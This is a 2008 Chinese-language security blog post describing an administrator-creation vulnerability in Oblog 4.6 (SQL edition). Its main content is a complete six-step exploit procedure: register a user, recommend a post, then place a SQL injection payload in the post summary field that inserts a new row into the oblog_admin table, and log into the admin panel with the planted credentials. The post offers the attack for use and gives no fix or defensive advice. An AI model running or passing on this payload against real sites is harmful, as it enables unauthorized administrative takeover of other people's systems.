---
title: Oblog4.6添加后台管理员漏洞(仅适用于sql版)
description: 最近夜火我收集的软件，安全工具等信息比较多，漏洞方面的很久没收集了，最重要的是技术有限。。。。看不懂的一些漏洞什么的，就直接pass掉了。今天这个是Oblog4.6添加后台管理员漏洞，仅适用于sql版，有完整利用过程介绍
date: 2008-09-15 10:15:53
category: 漏洞信息
tags: ['Oblog', '漏洞信息']
post_id: 605
alias: Oblog4.6-Add-admin-loopholes
ViewNums: 3312
---

最近[夜火](/blog/)我收集的[软件](/tags/%E8%BD%AF%E4%BB%B6)，[安全工具](http://www.15897.com/category/2)等信息比较多，[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)方面的很久没收集了，最重要的是技术有限。。。。看不懂的一些漏洞什么的，就直接pass掉了。

今天这个是[Oblog4.6添加后台管理员漏洞](/blog/oblog46-add-admin-loopholes)，仅适用于sql版，有完整利用过程介绍

1. 注册一个用户，用户名script，密码123456
2. 发布一篇日志，日志标题：测试一下
3. 个人前台首页找到日志"测试一下"，点"推荐"
4. 个人后台管理，选择"常用"选项中的"推荐日志"，然后点"测试一下"日志后面的修改，把摘要内容修改成：s'/**/WHERE/** /logid=1;insert/**/into/**/oblog_admin/**/(username,password,roleid)values('script','49ba59abbe56e057',0);--
5. 最后点"确认提交"按钮，如果提示修改成功，[注入](/tags/%E6%B3%A8%E5%85%A5)完成！
6. 登录后台，地址/admin/admin_login.asp，输入上面的用户名和密码，登录后台成功！

转载请著明来源于0x54.com

